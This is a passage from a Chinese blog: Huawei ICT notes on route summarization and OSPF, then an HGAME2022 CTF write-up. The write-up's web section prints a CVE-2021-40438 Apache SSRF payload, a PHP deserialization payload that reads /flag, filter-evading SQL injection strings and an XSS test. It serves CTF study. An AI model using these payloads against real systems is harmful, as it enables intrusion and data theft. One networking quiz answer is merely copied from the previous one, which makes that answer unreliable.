对于一个大规模的网络来说，路由器或其他具备路由功能的设备势必需要维护大量的路由表项，为了维护臃肿的路由表，这些设备就不得不耗费大量的资源。同时，由于路由表的规模变大，会导致路由器在查表转发时效率降低。因此在保证网络中的路由器到各网段都具备IP可达性的同时，需要减小设备的路由表规模。一个网络如果具备科学的IP编址，并且进行合理的规划，是可以利用多种手段减小设备路由表规模的。一个非常常见而又有效的办法就是使用路由汇总（Route Summarization）。路由汇总又被称为路由聚合（Route Aggregation），是将一组有规律的路由汇聚成一条路由，从而达到减小路由表规模以及优 化设备资源利用率的目的，我们把汇聚之前的这组路由称为精细路由或明细路由，把汇聚 之后的这条路由称为汇总路由或聚合路由 简介 RTA上为了能够前往远端地址，需要为每一个远端网段配置一条明细路由。去往10.1.1.0/24、10.1.2.0/24、10.1.3.0/24…拥有相同下一跳。将拥有相同下一跳，一组有规律的路由汇总成 一条路由，这叫做路由汇总。 计算将明细路由的目的网络都换算成二进制，然后排列起来，找出所有目的网络地址中&quot;相同的比特位&quot; 汇总引发的问题路由汇总会造成环路问题 解决方法： 在RTB上增加一条指向NULL0的路由 一般来说一条路由，无论是静态的或者是动态的，都需要关联到一个出接口，路由的出接口指的是设备要到达一个目的网络时的出站接口。路由的出接口可以是该设备的物理接口， 例如百兆、千兆以太网接口，也可以是逻辑接口，例如VLAN接口（VLAN Interface），或者隧道（Tunnel）接口等。在众多类型的出接口中，有一种接口非常特殊，那就是Null （无效）接口，这种类型的接口只有一个编号，也就是0。Null0是一个系统保留的逻辑接 口，当网络设备在转发某些数据包时，如果使用出接口为Null0的路由，那么这些报文将被 直接丢弃，就像被扔进了一个黑洞里，因此出接口为Null0的路由又被称为黑洞路由 精确汇总当配置的静态汇总路由范围太广时可能会将流量发送到其他的网段导致数据包丢失，这种路由为不精确路由。为此配置汇总路由时要尽量精确，刚好包括所有的明细路由 思考路由器如何优选路由条目？ 首先根据preference选择，如果preference相同则继续比较度量值，如果度量值也相同， 则都会被加入路由表形成等价路由。 如何配置实现浮动路由？ 首先根据preference选择，如果preference相同则继续比较度量值，如果度量值也相同， 则都会被加入路由表形成等价路由。 将10.1.1.0/24、10.1.3.0/24、10.1.9.0/24汇总之后的网段是？ 10.1.0.0/20 OSPF基础静态路由由网络管理员手工配置，因此当网络变化时，静态路由需要手工调整，制约了静态路由在现网的大规模应用。因此动态路由因其灵活性高、可靠性好，易于扩展等特点被广泛应用于现网。 而在动态路由协议中，OSPF(开放式最短路径优先)协议是使用场景非常广泛的动态路由协议之一，是一种基于链路状态算法的路由协议 OSPF协议概述为什么需要动态路由静态路由由网络管理员手动配置和维护，适用于小型或稳定的网络 但无法适应规模较大的网络，无法动态响应网络变化。 随着设备数量增加，配置量急剧增加，静态路由已无法适应 动态路由协议的分类 BGP使用一种基于距离矢量算法修改后的算法，该算法被称为路径矢量（Path Vector）算法。因此在某些场合下，BGP也被称为路径矢量路由协议。 距离矢量路由协议 运行矢量路由协议的路由器周期性的泛洪自己的路由表。通过路由交互，每台路由器都从相邻的路由器学习到路由，并且加载进自己的路由表中 对于网络中的所有路由器而言，路由器并不清楚网络的拓扑，只是简单的知道要去往某个目的方向在哪里，距离有多远。这就是距离矢量算法的本质。 链路状态路由协议链路状态路由协议-LSA泛洪与距离矢量协议不同，链路状态由协议通告的是链路状态而不是路由表。运行链路状态路由协议的路由器之间首先会建立一个协议的邻居关系，然后彼此之间开始交互LSA（Link State Advertisement，链路状态通告） 不再通告路由信息，而是LSA 链路状态通告，可以简单的理解为每台路由器都产生一个描述自己直连接口状态（包括接口的开销、与邻居路由器之间的关系等）的通告 链路状态路由协议-LSDB泛洪每台路由器都会产生LSAs，路由器将接收到的LSAs放入自己的LSDB（Link State DataBase，链路状态数据库）。LSDB汇总了网络中路由器对于自己接口的描述，包含全网拓扑的描述。路由器通过LSDB，掌握了全网的拓扑 链路状态路由协议-SPF计算每台路由器基于LSDB，使用SPF（Shortest Path First，最短路径优先）算法进行计算，每台路由器都计算出一颗以自己为根的、无环的、拥有最短路径的“树”。有了这颗“树”，路由器就以及知道了到达网络各个角落的优选路径 SPF是OSPF路由协议的一个核心算法，用来在一个复杂的网络中做出路由优选的决策。 链路状态路由协议-路由表生成路由器将根据SPF计算出来的优选路径，加载进自己的路由表 链路状态路由协议总结 第一步是建立相邻路由器之间的邻居关系。 第二步是邻居之间交互链路状态信息和同步LSDB。 第三步是进行优选路径计算。 第四步是根据最短路径树生成路由表项加载到路由表 OSPF简介 OSPF基础术语区域OSPF Area用于标识一个OSPF的区域 区域是从逻辑上将设备划分为不同的组，每个组用区域号(Area ID)来标识 Router-IDRouter-ID（Router Identifier，路由器标识符），用于在一个OSPF域中唯一地标识一台路由器。 Router-ID的设定可以通过手工配置的方式，或使用系统自动配置的方式。 在实际项目中，通常会通过手工配置方式为设备指定OSPF Router-ID。请注意必须保证在OSPF域中任意两台设备的Router-ID都不相同。通常的做法是将Router-ID配置为与该设备某个接口（通常为Loopback接口）的IP地址一致 度量值OSPF使用Colongtst（开销）作为路由的度量值。每一个激活了OSPF的接口都会维护一个接口的Cost值，缺省时接口Cost值=100 Mbit/s/接口带宽。其中100 Mbit/s为OSPF指定的缺省参考值，该值是可以配置的。 笼统地说，一条OSPF路由的Cost值可以理解为是从目的网段到本路由器沿途所有入接口的Cost值累加。 OSPF协议报文类型OSPF有五种类型的协议报文，这些报文在OSPF路由器之间交互中起不同的作用 OSPF三大表项OSPF有三张重要的表项，OSPF邻居表、LSDB表和OSPF路由表 OSPF邻居表OSPF在传递链路状态信息之前，需先建立OSPF邻居关系 OSPF的邻居关系通过交互Hello报文建立 OSPF邻居表显示了OSPF路由器之间的邻居状态，使用display ospf peer查看 LSDB表LSDB会保存自己产生的及从邻居收到的LSA信息 Type标识LSA的类型，AdvRouter标识发送LSA的路由器 使用命令行display ospf lsdb查看LSDB表 OSPF路由表OSPF路由表和路由器路由表是两张不同的表项 OSPF路由表包含Destination、Cost和NextHop等指导转发的信息。 使用display ospf routing查看OSPF路由表 OSPF协议工作原理OSPF路由器之间的关系 OSPF路由器之间的关系有两个重要的概念，邻居关系和邻接关系 假设两台路由器直连，在双方互联接口上激活OSPF，路由器开始发送及侦听Hello报文，在通过Hello报文发现彼此后，这两台路由器便形成了邻居关系 邻居关系的建立只是开始，后续会进行一系列的报文交互，例如前文提到的DD、LSR、LSU和LS ACK等，当两台路由器LSDB同步完成，并开始独立计算路由时，这两台路由器形成了邻接关系 OSPF邻接关系建立过程OSPF完成邻接关系的建立有四个步骤，建立邻居关系、协商主/从、交互LSDB信息，同步LSDB。 流程1 当一台OSPF路由器收到其他路由器发来的首个Hello报文时会从初始Down状态切换为Init 状态。 当OSPF路由器收到的Hello报文中的邻居字段包含自己的Router ID时，从Init切换2-way状 态 流程2&amp;3 邻居状态机从2-way转为Exstart状态后开始主从关系选举： R1向R2发送的第一个DD报文内容为空，其Seq序列号假设为X。 R2也向R1发出第一个DD报文，其Seq序列号假设为Y。 选举主从关系的规则是比较Router ID，越大越优。R2的Router ID比R1大，因此R2成 为真正的主设备。主从关系比较结束后，R1的状态从Exstart转变为Exchange。 R1邻居状态变为Exchange后，R1发送一个新的DD报文，包含自己LSDB的描述信息，其序 列号采用主设备R2的序列号。R2收到后邻居状态从Exstart转变为Exchange。 R2向R1发送一个新的DD报文，包含自己LSDB的描述信息，序列号为Y+1。 R1作为从路由器需要对主路由R2发送的每个DD报文进行确认，回复报文的序列号与主路由 R2一致。 发送完最后一个DD报文后，R1将邻居状态切换为Loading。 流程4 邻居状态转变为Loading后，R1向R2发送LSR报文，请求那些在Exchange状态下通过DD报 文发现的，但是在本地LSDB中没有的LSA。 R2收到后向R1回复LSU。在LSU报文中包含被请求的LSA的详细信息。 R1收到LSU报文后，向R2回复LS ACK报文，确认已接收到，确保信息传输的可靠性。 此过程中R2也会向R1发送LSA请求。当两端LSDB完全一致时，邻居状态变为Full，表示成 功建立邻接关系。 OSPF网络类型简介OSPF网络类型是一个非常重要的接口变量，这个变量将影响OSPF在接口上的操作，例如采用什么方式发送OSPF协议报文，以及是否需要选举DR、BDR等。 接口默认的OSPF网络类型取决于接口所使用的数据链路层封装 OSPF有四种网络类型 Broadcast、NBMA、P2MP和P2P OSPF网络类型（1）一般情况下，链路两端的OSPF接口网络类型必须一致，否则双方无法建立邻居关系 OSPF网络类型可以在接口下通过命令手动修改以适应不同网络场景 OSPF网络类型（2） DR与BDR背景： MA（Multi-Access）多路访问网络有两种类型：广播型多路访问网络（BMA）及非广播类多路访问网络（NBMA）。以太网（Ethernet）是一种典型的广播型多路访问网络 在MA网络中，如果每台OSPF路由器都与其他的路由器建立OSPF邻接关系，便会导致网络中存在过多的OSPF邻接关系，增加设备负担，也增加了网络中泛洪的OSPF报文数量 当拓扑出现变更，网络中的LSA泛洪可能会造成带宽的浪费和设备资源的损耗 为优化MA网络中OSPF邻接关系，OSPF指定了三种OSPF路由器身份，DR（Designated Router，指定路由器）、BDR（Backup Designated Router，备用指定路由器）和DRother路由器。 只允许DR、BDR与其他OSPF路由器建立邻接关系。DRother之间不会建立全毗邻的OSPF邻接关系，双方停滞在2-way状态 BDR会监控DR的状态，并在当前DR发生故障时接替其角色 选举规则：OSPF DR优先级更高的接口成为该MA的DR，如果优先级相等（默认为1），则 具有更高的OSPF Router-ID的路由器（的接口）被选举成DR，并且DR具有非抢占性。 OSPF域与单区域OSPF域（Domain）：一系列使用相同策略的连续OSPF网络设备所构成的网络。 OSPF路由器在同一个区域内网络中泛洪LSA。为了确保每台路由器都拥有对网络拓扑的一致认知，LSDB需要在区域内进行同步。 如果OSPF域仅有一个区域，随着网络规模越来越大，OSPF路由器的数量越来越多，这将会导致诸多问题： LSDB越来越庞大，同时导致OSPF路由表规模增加，路由器资源消耗多，设备性能下降，影响数据转发 基于庞大的LSDB进行路由计算变得困难 当网络拓扑变更时，LSA全域泛洪和全网SPF重计算带来巨大负担 OSPF多区域OSPF引入区域的概念，将一个OSPF域划分成多个区域，可以使OSPF支撑更大规模组网。 OSPF多区域的设计减小了LSA泛洪的范围，有效的把拓扑变化的影响控制在区域内，达到网络优化的目的。 在区域边界可以做路由汇总，减小了路由表规模。 多区域提高了网络扩展性，有利于组建大规模的网络。 区域的分类：区域可以分为骨干区域与非骨干区域。骨干区域即Area0，除Area0以外其他 区域都称为非骨干区域。 多区域互联原则：基于防止区域间环路的考虑，非骨干区域与非骨干区域不能直接相连， 所有非骨干区域必须与骨干区域相连 OSPF路由器类型OSPF路由器根据其位置或功能不同，分为 区域内路由器（Internal Router）：该类路由器的所有接口都属于同一个OSPF区域。 区域边界路由器ABR（Area Border Router）：该类路由器的接口同时属于两个以上的区域， 但至少有一个接口属于骨干区域。 骨干路由器（Backbone Router）：该类路由器至少有一个接口属于骨干区域。 自治系统边界路由器ASBR（AS Boundary Router）：该类路由器与其他AS交换路由信息。 只要一台OSPF路由器引入了外部路由的信息，它就成为ASBR。 OSPF单区域&amp;多区域典型组网中小型企业网络规模不大，路由设备数量有限，可以考虑将所有设备都放在同一个OSPF区 域。 大型企业网络规模大，路由设备数量很多，网络层次分明，建议采用OSPF多区域的方式部 署。","categories":[],"tags":[{"name":"华为ict","slug":"华为ict","permalink":"https://ethe448.github.io/tags/%E5%8D%8E%E4%B8%BAict/"}]},{"title":"HGAME2022 wp","slug":"HGAME2022-wp","date":"2022-01-21T09:09:12.000Z","updated":"2022-03-31T14:13:08.669Z","comments":true,"path":"2022/01/21/HGAME2022-wp/","link":"","permalink":"https://ethe448.github.io/2022/01/21/HGAME2022-wp/","excerpt":"","text":"带*为赛后复现 第一周wpMISC欢迎欢迎！热烈欢迎！签到 这个压缩包有点麻烦压缩包，先真加密，爆破得到密码，然后字典爆破，再明文爆破，最后得到的一个藏着伪加密压缩包的图片，破掉伪加密把压缩包解压能得到flag 好康的流量wireshark打开，追踪tcp流得到一大串base64值，转成图片 stegslove看一下 找个在线扫条形码的网站扫一下得到前半部分，后半部分利用zsteg能直接看到 群青(其实是幽灵东京）第一个音频文件 猜密码是yoasobi 得到一个网址，里面是sstv为文件名的音频文件，用robot36接收一下 得到一个二维码 扫码拿到flag WEBeasy_auth 题目描述暗示todo里藏着东西，看一下源码 猜到flag可能再id为1的内容里 访问的时候显示没添加cookie或者token 抓包给他加个jwt jwt可以根据前边的网页抓包得到的jwt修改 蛛蛛...嘿嘿♥我的蛛蛛 from time import sleep import requests url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot; key &#x3D; &quot;?key&#x3D;VmqCK2lB2LRY2sM%2F5rEjFXHRemjYkb%2BQ2YHG8z7oy1krIf6R%2FOVrA8Ho5G9rxahnu6%2BTfwj6ZRbt3YP405Y12Q%3D%3D&quot; for i in range(1, 1000): url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot; url &#x3D; url + key print(url) r &#x3D; requests.get(url&#x3D;url) # if &#39;href&#39; in r.text: print(r.text) lstNew &#x3D; r.text if &#39;href&#39; in lstNew: start &#x3D; lstNew.find(&quot;href&#x3D;\\&quot;?&quot;) print(start) end &#x3D; lstNew.find(&quot;D\\&quot;&gt;点我试试&quot;) print(end) length &#x3D; len(&quot;href&#x3D;\\&quot;&quot;) l &#x3D; lstNew[start + length:end +1] key &#x3D; l print(key) if key &#x3D;&#x3D; &#39;&#39;: break sleep(0.5) if &quot;hgame&#123;&quot; in r.text: print(r.text) break else: print(r.text) break 写的脚本（好拉的编程 跑到第100关后在响应头里找 Tetris plus源码里直接找 Fujiwara Tofu Shop 先加个referer头为qiumingshan.net 然后改ua 再改cookie flavor = Raspberry 然后再加上一个Gasoline:100 再是要求本地登录，但是过滤了xff，换个头就行 IOT饭卡的uno不会iot，但是这个把附件拖了ida里就能看见flag CRYPTOEasy RSA已知p，q，e和密文求明文的rsa import libnum from Crypto.Util.number import long_to_bytes string &#x3D; &#39;&#39; flag &#x3D; [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)] for x in range(38): c &#x3D; flag[x][3] q &#x3D; flag[x][2] p &#x3D; flag[x][1] n &#x3D; p*q e &#x3D; flag[x][0] d &#x3D; libnum.invmod(e, (p - 1) * (q - 1)) m &#x3D; pow(c, d, n) string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;) print(string) English Novel给了四个文件，一个小说原文，一个加密后的小说，一个加密脚本，一个flag密文 先根据小说原文里的标点通过Linux的grep命令看一下相对的密文 再根据加密脚本逆向写出求key的脚本，然后是求密文（真的好拉的编程 def encrypt(data, key): # assert len(data) &lt;&#x3D; len(key) result &#x3D; &quot;&quot; for i in range(len(data)): if data[i].isupper(): result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) elif data[i].islower(): result +&#x3D; chr((ord(data[i]) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;)) else: result +&#x3D; data[i] return result def decrypt(result, key): # assert len(data) &lt;&#x3D; len(key) data &#x3D; &quot;&quot; for i in range(len(result)): if result[i].isupper(): #result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) for k in range(65,90):#python这个对负数求余真不知道怎么逆了，只能爆破了 result1 &#x3D; chr((k - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) if result1 &#x3D;&#x3D; result[i]: data +&#x3D; chr(k) elif result[i].islower(): for k in range(96,123): result1 &#x3D; chr((ord(chr(k)) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;)) if result1 &#x3D;&#x3D; result[i]: data +&#x3D; chr(k) else: data +&#x3D; result[i] print(data) def decryptkey(data1, result1): keyboard &#x3D; [] for n in range(25): for i in range(len(data1)): if data[i].isupper(): # result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) key &#x3D; str((ord(result1[i]) - ord(&#39;A&#39;) + (26 * n)) + ord(&#39;A&#39;) - ord(data1[i])) keyboard.append(key) elif data[i].islower(): key &#x3D; str((ord(result1[i]) - ord(&#39;a&#39;) + (26 * n)) + ord(&#39;a&#39;) - ord(data1[i])) keyboard.append(key) else: key &#x3D; 0 keyboard.append(key) n &#x3D; str(n) for i in keyboard: print(i, end&#x3D;&#39;,&#39;) print(&#39;&#x2F;n&#39;) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: data &#x3D; &quot;&quot;&quot;urveying the ground, Snowball declared that this was just the place for a windmill&quot;&quot;&quot;#这里写原文 result &#x3D; &quot;klsyf&#123;W0_j0v_ca0z_&#39;Ks0ao-bln1qstxp_juqfqy&#39;?&#125;&quot;#这里写密文 a &#x3D; [3, 5, -8, 12, 1, -2, -7, 10, 0, -15, 1, 1, 0, 18, -13, -7, 3, 12, 20, 0, 0, -16, 4, 1, -17, 12, 0, 13, -4, 0, -1, 15, 0, -4, 25, -17, 1, -3, 0, -12, 14, 3, 3, 0, 0, 8, -8, 6, 0, 0, 21, 7, 0, -5, -20, -6, -17, 0, -6, 13, 8, 0,2, 1, 20, 20, -1, 0, 16, -10, -1, 0, 21, 0, -6, -5, 9, 18, 10, 16, 10, 5, 0, 0, 0, 6, -8, -1, 7, 0, 20, 9, 2, 3, -3] #decryptkey(data, result) decrypt(result, a) #print(encrypt(data, a)) 这个flag在单引号里边的部分还是有点问题，可能是因为key的关系，但是由attfck能猜出attack，由pla1qtext能猜出plaintext，然后改完之后搜一下 最终flag hgame{D0_y0u_kn0w_&#39;Kn0wn-pla1ntext_attack&#39;?} 第二周wpWEBApache!*有备份文件 根据题目描述应该是ssrf漏洞，结合apache版本能搜到CVE-2021-40438 ?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:&#x2F;&#x2F;internal.host&#x2F; 但是网上的 exp 大多是 Apache 直接作为代理服务器的情况，这题给了 Apache 的配置文件 https-vhosts.conf , &#39;/&#39; 提供静态资源服务， &#39;/proxy&#39; 提供代理服务。 所以要在/proxy路径下用payload webpack-engine 看源码，两次base64解码得到flag hgame&#123;D0nt_f0r9et_2_ClOs3_S0urce_m@p&#125; 一本单词书看源码有www.zip的提示 代码审计一下 简单的用户判断 绕过之后 看index.php 大致逻辑就是将输入的传入get.php和save.php进行处理 save.php 将传入的单词的key和value写入文件中，并利用|来将key和value的序列化之后的值分隔。 get.php 读取save.php中创建的文件的内容 evil.php 看见wakeup方法，再联系get.php时的unserialize可以猜测这里是要利用反序列化让file=/flag然后令flag变量的值变为flag再利用get.php将其读出来 这里要注意序列化的内容要在填在单词的位置，将其作为数组的key而不是value，否则在encode函数时会对value再进行一次序列化导致payload改变，无法执行反序列化操作 还要在反序列化的payload前添加|符号 让|后的部分执行decode函数中的反序列化 将evil类中的file赋值为/flag，从而让flag=/flag文件中的内容 这里的if过滤没啥用 最终payload &#123;|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;N;&#125; Pokemon 开始页面，源码里提示了个index?id=1 输到url上能看出来id的数决定了出现的是哪个精灵 当id不是1，2，3其中的数时会跳转到error.php 刚开始感觉是sql注入，注了半天这个页面没报错，这里id的值感觉是通过php的弱比较来判断的，开始怀疑是不是别的漏洞。 扫了一下扫到了db.php才确定就是sql注入 于是尝试在error界面注入 当code不为数字时会出现报错 刚开始没有给源码，试了好几次没试出来怎么注入 主办方给的源码： 有了源码之后就是一个很简单的联合注入了 括号或者/*x*/替代空格，用like替代等于，双写绕过关键字，因为是数字型注入，所以也不需要注释符 爆库名 ?code&#x3D;1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,database() ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere(table_schema)like&#39;pokemon&#39; ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name)like&#39;fllllllllaaaaaag&#39; ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,(flag)frfromom&#x2F;*x*&#x2F;fllllllllaaaaaa At0m的留言板*xss漏洞 说起这个我就想起来b站那次的xss，还有我还没开始的js学习（ 先试一下 &lt;script&gt;alert(1)&lt;&#x2F;script&gt; 确定是xss 然后主办方给了个hint 输出用户留言位置的class标签名为content，然后还有一个用var定义的flag全局变量 